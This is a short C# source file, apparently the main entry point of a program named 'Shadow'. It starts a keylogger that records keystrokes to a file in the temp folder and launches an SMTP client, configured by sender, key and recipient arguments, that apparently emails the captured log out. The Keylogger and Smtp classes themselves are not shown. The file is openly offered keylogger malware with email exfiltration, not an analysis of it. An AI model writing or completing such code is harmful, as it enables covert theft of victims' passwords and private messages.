using System;
using System.IO;
using System.Threading.Tasks;

namespace Shadow
{
    public class Shadow
    {
        static void Main(string[] args)
        {
            // Credentials Not Stored Locally
            if (args.Length < 3)
            {
                throw new ArgumentException("[From] [Key] [To]");
            }

            // Keystrokes Path
            var path = Path.Combine(Path.GetTempPath(), @"Shadow\Keystrokes.txt");

            // Start Smtp 
            var smtp = new Smtp(args[0], args[1], args[2], path);
            Task.Run(async () => await smtp.Start());

            // Start Keylogger
            var keylogger = new Keylogger(path);
            keylogger.Start();
        }
    }
}
